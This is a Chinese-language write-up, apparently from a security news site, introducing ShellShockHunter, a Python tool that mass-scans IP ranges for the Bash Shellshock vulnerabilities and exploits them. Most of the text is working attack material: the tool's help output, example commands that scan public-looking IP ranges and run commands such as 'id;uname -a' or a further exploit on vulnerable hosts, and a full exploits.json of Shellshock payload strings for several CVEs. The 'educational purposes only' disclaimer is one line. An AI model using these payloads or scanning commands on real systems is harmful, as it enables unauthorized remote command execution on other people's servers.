![](https://image.3001.net/images/20210312/1615555244_604b6aacdd7c5416398aa.png!small)

## 关于Shellshock（软件漏洞）

Shellshock，也被称为Bashdoor，是Unix Bash
shell中的一系列安全漏洞，第一个漏洞于2014年9月24日披露。Shellshock将允许攻击者使Bash执行任意命令，并获得对许多使用Bash处理请求的面向Internet的服务（如Web服务器）的未经授权的访问权限。

## 关于ShellShockHunter

本工具的开发与发布仅出于教育目的，未经允许不得使用。任何使用该工具的人员所造成的任何损坏（包括但不仅限于数据丢失、系统崩溃、系统损坏等）都应用户自己负责。

## 工具安装

广大研究人员可以使用[ _pip_](https://pip.pypa.io/en/stable/)命令完成ShellShockHunter的安装：

    
    
    pip install shodan
    
    pip install ipinfo

## 工具帮助信息

    
    
    python main.py --help
    
     
    
                            
    
                                              ,/
    
                                            ,'/
    
                                          ,' /
    
                                        ,'  /_____,
    
                                      .'____    ,'    
    
                                            /  ,'
    
                                          / ,'
    
                                          /,'
    
                                        /'
    
                 ____  _     _____ _     _     ____  _      ___       _    
    
                / ___|| |__ |___ /| |   | |   / ___|| |__  / _ \  ___| | __
    
                \___ \| '_ \  |_ \| |   | |   \___ \| '_ \| | | |/ __| |/ /
    
                 ___) | | | |___) | |___| |___ ___) | | | | |_| | (__|   <
    
                |____/|_| |_|____/|_____|_____|____/|_| |_|\___/ \___|_|\_\
    
                         __   _   _             _              __                  
    
                        | _| | | | |_   _ _ __ | |_ ___ _ __  |_ |                 
    
                        | |  | |_| | | | | '_ \| __/ _ \ '__|  | |                 
    
                        | |  |  _  | |_| | | | | ||  __/ |     | |                 
    
                        | |  |_| |_|\__,_|_| |_|\__\___|_|     | |                 
    
                        |__|                                  |__| v1.0                
    
                          By: MrCl0wn / https://blog.mrcl0wn.com                                                                          
    
             
    
    usage: tool [-h] [--file <ips.txt>] [--range <ip-start>,<ip-end>]
    
    [--cmd-cgi <command shell>] [--exec-vuln <command shell>] [--thread <20>]
    
    [--check] [--ssl] [--cgi-file <cgi.txt>] [--timeout <5>] [--all] [--debug]
    
     
    
    optional arguments:
    
      -h, --help                   show this help message and exit
    
      --file <ips.txt>             Input your target host lists
    
      --range <ip-start>,<ip-end>  Set range IP Eg.: 192.168.15.1,192.168.15.100
    
      --cmd-cgi <command shell>    Define shell command that will be executed in the payload
    
      --exec-vuln <command shell>  Executing commands on vulnerable targets
    
      --thread <20>, -t <20>       Eg. 20
    
      --check                      Check for shellshock vulnerability
    
      --ssl                        Enable request with SSL
    
      --cgi-file <cgi.txt>         Defines a CGI file to be used
    
      --timeout <5>                Set connection timeout
    
      --all                        Teste all payloads
    
      --debug, -d                  Enable debug mode

## 工具使用命令

    
    
    python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl
    
     
    
    python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'
    
     
    
    python main.py --range '194.206.187.X,194.206.187.XXX' --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'
    
     
    
    python main.py --file targets.txt --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'
    
     
    
    python main.py --file targets.txt --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt' --all
    
     
    
    python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl --cgi-file 'wordlist/cgi2.txt' --exec-vuln 'curl -v -k -i "_TARGET_"'
    
     
    
    python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl --cgi-file 'wordlist/cgi2.txt' --exec-vuln './exploit -t "_TARGET_"'
    
     
    
    python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl --cgi-file 'wordlist/cgi2.txt' --exec-vuln './exploit -t "_TARGET_"' --debug

## 工具运行截图

### 工具开启：

![](https://image.3001.net/images/20210312/1615555304_604b6ae8954d540cc7e33.png!small)

### 处理过程：

![](https://image.3001.net/images/20210312/1615555313_604b6af1e080674d62a70.png!small)

### 指定命令（ --exec-vuln 'echo "_TARGET_"' ）：

![](https://image.3001.net/images/20210312/1615555322_604b6afad507ff1e5dc79.png!small)

### 命令（--debug）：

![](https://image.3001.net/images/20210312/1615555332_604b6b044fb902bb0ee97.png!small)

## 源文件（漏洞利用）

> pwd：assets/exploit.json
    
    
    {
    
        "DEFAULT":
    
            "() { :; }; echo ; /bin/bash -c '_COMMAND_'",
    
        "CVE-2014-6271":
    
            "() { :; }; echo _CHECKER_; /bin/bash -c '_COMMAND_'",
    
        "CVE-2014-6271-2":
    
            "() { :;}; echo '_CHECKER_' 'BASH_FUNC_x()=() { :;}; echo _CHECKER_' bash -c 'echo _COMMAND_'",
    
        "CVE-2014-6271-3":
    
            "() { :; }; echo ; /bin/bash -c '_COMMAND_';echo _CHECKER_;",
    
        "CVE-2014-7169":
    
            "() { (a)=>\\' /bin/bash -c 'echo _CHECKER_'; cat echo",
    
        "CVE-2014-7186":
    
            "/bin/bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo '_CHECKER_, redir_stack'",
    
        "CVE-2014-7187":
    
            "(for x in {1..200} ; do echo \"for x$x in ; do :\"; done; for x in {1..200} ; do echo done ; done) | /bin/bash || echo '_CHECKER_, word_lineno'",
    
        "CVE-2014-6278":
    
            "() { _; } >_[$($())] { echo _CHECKER_; id; } /bin/bash -c '_COMMAND_'",
    
        "CVE-2014-6278-2":    
    
            "shellshocker='() { echo _CHECKER_; }' bash -c shellshocker",
    
        "CVE-2014-6277":
    
            "() { x() { _; }; x() { _; } <<a; } /bin/bash -c _COMMAND_;echo _CHECKER_",
    
        "CVE-2014-*":
    
            "() { }; echo _CHECKER_' /bin/bash -c '_COMMAND_'"
    
    }

## 源文件（工具配置）

> pwd: assets/config.json
    
    
    {
    
        "config": {
    
            "threads": 20,
    
            "path": {
    
                "path_output": "output/",
    
                "path_wordlist": "wordlist/",
    
                "path_modules": "modules/",
    
                "path_assets": "assets/"
    
            },
    
            "files_assets":{
    
                "config": "assets/config.json",
    
                "autor": "assets/autor.json",
    
                "exploits": "assets/exploits.json"
    
            },
    
            "api":{
    
                "shodan":"",
    
                "ipinfo":""
    
            }
    
        }
    
    }

## 项目结构

    
    
    ├── assets
    
    │   ├── autor.json
    
    │   ├── config.json
    
    │   ├── exploits.json
    
    │   └── prints
    
    │       ├── banner.png
    
    │       ├── print00.png
    
    │       ├── print01.png
    
    │       ├── print02.png
    
    │       └── print03.png
    
    ├── LICENSE
    
    ├── main.py
    
    ├── modules
    
    │   ├── banner_shock.py
    
    │   ├── color_shock.py
    
    │   ├── debug_shock.py
    
    │   ├── file_shock.py
    
    │   ├── __init__.py
    
    │   ├── request_shock.py
    
    │   ├── shodan_shock.py
    
    │   └── thread_shock.py
    
    ├── output
    
    │   └── vuln.txt
    
    ├── README.md
    
    └── wordlist
    
    └── cgi.txt

## 项目地址

ShellShockHunter：【[
_GitHub传送门_](https://github.com/MrCl0wnLab/ShellShockHunter)】

## 参考资料

> [ _https://owasp.org/www-pdf-archive/Shellshock_-> _Tudor_Enache.pdf_](https://owasp.org/www-pdf-archive/Shellshock_-> _Tudor_Enache.pdf)
>
> [
> _https://blog.inurl.com.br/search?q=shellshock_](https://blog.inurl.com.br/search?q=shellshock)
>
> [ _https://github.com/googleinurl/Xpl-SHELLSHOCK-> Ch3ck/blob/master/xplSHELLSHOCK.php_](https://github.com/googleinurl/Xpl-> SHELLSHOCK-Ch3ck/blob/master/xplSHELLSHOCK.php)
>
> [
> _https://github.com/chelseakomlo/shellshock_demo_](https://github.com/chelseakomlo/shellshock_demo)
>
> [
> _https://github.com/xdistro/ShellShock/blob/master/shellshock_test.sh_](https://github.com/xdistro/ShellShock/blob/master/shellshock_test.sh)
>
> [
> _https://github.com/capture0x/XSHOCK/blob/master/main.py_](https://github.com/capture0x/XSHOCK/blob/master/main.py)
>
> [ _https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-> cracked.html_](https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-> cracked.html)
>
> [ _https://blog.sucuri.net/2014/09/bash-vulnerability-shell-shock-thousands-> of-cpanel-sites-are-high-risk.html_](https://blog.sucuri.net/2014/09/bash-> vulnerability-shell-shock-thousands-of-cpanel-sites-are-high-risk.html)
>
> [ _https://github.com/BuddhaLabs/PacketStorm-> Exploits/blob/master/1410-exploits/apachemodcgi-> shellshock.txt_](https://github.com/BuddhaLabs/PacketStorm-> Exploits/blob/master/1410-exploits/apachemodcgi-shellshock.txt)
>
> [
> _https://github.com/gajos112/OSCP/blob/master/Shellshock.txt_](https://github.com/gajos112/OSCP/blob/master/Shellshock.txt)
>
> [ _https://dl.packetstormsecurity.net/1606-exploits/sunsecuregdog-> shellshock.txt_](https://dl.packetstormsecurity.net/1606-exploits/sunsecuregdog-> shellshock.txt)
>
> [ _http://stuff.ipsecs.com/files/ucs-> shellshock_pl.txt_](http://stuff.ipsecs.com/files/ucs-shellshock_pl.txt)
>
> [ _https://github.com/opsxcq/exploit-> CVE-2014-6271_](https://github.com/opsxcq/exploit-CVE-2014-6271)
>
> [ _https://manualdousuario.net/shellshock-bash-> falha/_](https://manualdousuario.net/shellshock-bash-falha/)
>
> [ _https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-> exploit_](https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-> exploit)

